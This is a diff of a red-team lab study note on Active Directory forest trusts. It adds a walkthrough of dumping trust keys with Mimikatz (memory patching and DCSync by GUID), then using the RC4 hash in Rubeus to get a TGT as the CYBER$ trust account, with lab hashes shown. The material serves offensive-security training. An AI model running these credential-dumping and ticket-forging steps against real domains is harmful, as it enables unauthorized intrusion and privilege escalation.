@@ -2,7 +2,7 @@
 description: 10/02/2025
 ---
 
-# Forest & Domain Trusts
+# ✅ Forest & Domain Trusts
 
 ## Introduction
 
@@ -454,7 +454,7 @@ Both domains in a trust relationship will store a shared password (which gets ch
 
 These objects are stored in the system container and can be read via LDAP.
 
-**Here, we can see that the DC in `CYBER` has two TDOs for its trusts with `DEV` and `MSP`:**
+**Here, we can see that the DC in&#x20;**<mark style="color:yellow;">**`CYBER`**</mark>**&#x20;has two TDOs for its trusts with&#x20;**<mark style="color:yellow;">**`DEV`**</mark>**&#x20;and&#x20;**<mark style="color:yellow;">**`MSP`**</mark>**:**
 
 ```
 beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=trustedDomain)" --domain cyberbotic.io --attributes distinguishedName,name,flatName,trustDirection
@@ -471,3 +471,165 @@ beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --s
 	[+] trustDirection    : 2
 ```
 
+**There are&#x20;**<mark style="color:$success;">**two options for obtaining the key material**</mark>**:**
+
+1. **Move laterally to the DC and dump from memory:**
+
+```
+beacon> run hostname
+dc-1
+
+beacon> getuid
+[*] You are NT AUTHORITY\SYSTEM (admin)
+
+beacon> mimikatz lsadump::trust /patch
+
+Domain: MSP.ORG (MSP / S-1-5-21-616357355-3455548143-339820157)
+ [  In ] CYBERBOTIC.IO -> MSP.ORG
+
+ [ Out ] MSP.ORG -> CYBERBOTIC.IO
+    * 8/16/2022 9:49:17 AM - CLEAR   - 93 8e aa 1f 5f 6e 2a cc 51 7d d4 a8 07 f2 f0 2c a3 e0 20 3b 24 32 68 58 0d f8 ad cc
+	* aes256_hmac       5db44be4317433d5ab1d3dea5925126d295d3e21c9682bca7fef76bc5a878f30
+	* aes128_hmac       9851d2d80411e6d40122005d1c361579
+	* rc4_hmac_nt       f3fc2312d9d1f80b78e67d55d41ad496
+
+ [ In-1] CYBERBOTIC.IO -> MSP.ORG
+
+ [Out-1] MSP.ORG -> CYBERBOTIC.IO
+    * 8/16/2022 9:49:17 AM - CLEAR   - 93 8e aa 1f 5f 6e 2a cc 51 7d d4 a8 07 f2 f0 2c a3 e0 20 3b 24 32 68 58 0d f8 ad cc
+	* aes256_hmac       5db44be4317433d5ab1d3dea5925126d295d3e21c9682bca7fef76bc5a878f30
+	* aes128_hmac       9851d2d80411e6d40122005d1c361579
+	* rc4_hmac_nt       f3fc2312d9d1f80b78e67d55d41ad496
+```
+
+{% hint style="danger" %}
+**KEEP IN MIND:**&#x20;
+
+This performs memory patching, which is very risky, particularly on a domain controller.
+{% endhint %}
+
+2. <mark style="color:yellow;">**`DCSync`**</mark>**&#x20;with the TDO's GUID:**
+
+```
+beacon> powershell Get-DomainObject -Identity "CN=msp.org,CN=System,DC=cyberbotic,DC=io" | select objectGuid
+
+objectguid                          
+----------                          
+b93d2e36-48df-46bf-89d5-2fc22c139b43
+```
+
+```
+beacon> mimikatz @lsadump::dcsync /domain:cyberbotic.io /guid:{b93d2e36-48df-46bf-89d5-2fc22c139b43}
+
+[DC] 'cyberbotic.io' will be the domain
+[DC] 'dc-1.cyberbotic.io' will be the DC server
+[DC] Object with GUID '{b93d2e36-48df-46bf-89d5-2fc22c139b43}'
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : msp.org
+
+** TRUSTED DOMAIN - Antisocial **
+
+Partner              : msp.org
+ [ Out ] MSP.ORG -> CYBERBOTIC.IO
+    * 8/16/2022 9:49:17 AM - CLEAR   - 93 8e aa 1f 5f 6e 2a cc 51 7d d4 a8 07 f2 f0 2c a3 e0 20 3b 24 32 68 58 0d f8 ad cc
+	* aes256_hmac       5db44be4317433d5ab1d3dea5925126d295d3e21c9682bca7fef76bc5a878f30
+	* aes128_hmac       9851d2d80411e6d40122005d1c361579
+	* rc4_hmac_nt       f3fc2312d9d1f80b78e67d55d41ad496
+
+ [Out-1] MSP.ORG -> CYBERBOTIC.IO
+    * 8/16/2022 9:49:17 AM - CLEAR   - 93 8e aa 1f 5f 6e 2a cc 51 7d d4 a8 07 f2 f0 2c a3 e0 20 3b 24 32 68 58 0d f8 ad cc
+	* aes256_hmac       5db44be4317433d5ab1d3dea5925126d295d3e21c9682bca7fef76bc5a878f30
+	* aes128_hmac       9851d2d80411e6d40122005d1c361579
+	* rc4_hmac_nt       f3fc2312d9d1f80b78e67d55d41ad496
+```
+
+#### Output
+
+<mark style="color:yellow;">`[Out]`</mark> and <mark style="color:yellow;">`[Out-1]`</mark> are the "new" and "old" passwords respectively.&#x20;
+
+* They're the same because 30 days has not elapsed since the creation of the trust.
+
+In most cases, <mark style="color:green;">the current</mark> <mark style="color:yellow;">`[Out]`</mark> <mark style="color:green;">key is the one that you want</mark>.
+
+Also, there is a "trust account" which is created in the "trusted" domain, with the name of the "trusting" domain.
+
+**For instance, if we get all the user accounts in the `DEV` domain, we will see `CYBER$` and `STUDIO$`, which are the trust accounts for those respective domain trusts:**
+
+```
+beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=user)"
+
+[*] TOTAL NUMBER OF SEARCH RESULTS: 11
+
+        [...]
+	[+] cn : CYBER$
+	[+] cn : STUDIO$
+```
+
+This means that the `MSP` domain will have a trust account called `CYBER$`, even though we can't enumerate across the trust to confirm it.
+
+**This is the account we must impersonate to request Kerberos tickets across the trust:**
+
+```
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:CYBER$ /domain:msp.org /rc4:f3fc2312d9d1f80b78e67d55d41ad496 /nowrap
+
+[*] Action: Ask TGT
+
+[*] Using rc4_hmac hash: f3fc2312d9d1f80b78e67d55d41ad496
+[*] Building AS-REQ (w/ preauth) for: 'msp.org\CYBER$'
+[*] Using domain controller: 10.10.151.10:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIFGD[...]Aub3Jn
+
+  ServiceName              :  krbtgt/msp.org
+  ServiceRealm             :  MSP.ORG
+  UserName                 :  CYBER$
+  UserRealm                :  MSP.ORG
+  StartTime                :  9/12/2022 2:03:12 PM
+  EndTime                  :  9/13/2022 12:03:12 AM
+  RenewTill                :  9/19/2022 2:03:12 PM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  rc4_hmac
+  Base64(key)              :  Uf2X2f65qJYeHow3kfHG2w==
+  ASREP (key)              :  F3FC2312D9D1F80B78E67D55D41AD496
+```
+
+{% hint style="info" %}
+Remember that RC4 tickets are used by default across trusts.
+{% endhint %}
+
+**This TGT can now be used to interact with the domain:**
+
+```
+beacon> run klist
+
+Current LogonId is 0:0x537833
+
+Cached Tickets: (1)
+
+#0>	Client: CYBER$ @ MSP.ORG
+	Server: krbtgt/msp.org @ MSP.ORG
+	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+
+beacon> powershell Get-Domain -Domain msp.org
+
+Forest                  : msp.org
+DomainControllers       : {ad.msp.org}
+Children                : {}
+DomainMode              : Unknown
+DomainModeLevel         : 7
+Parent                  : 
+PdcRoleOwner            : ad.msp.org
+RidRoleOwner            : ad.msp.org
+InfrastructureRoleOwner : ad.msp.org
+Name                    : msp.org
+```
+
+This account is obviously not a domain admin, but there are multiple abuse primitives that can be performed across the trust to elevate privileges — including Kerberoasting, ASREPRoasting, RBCD, and vulnerable certificate templates.
+
+{% hint style="info" %}
+As a challenge, find a way to get DA in this forest using one of those methods!
+{% endhint %}
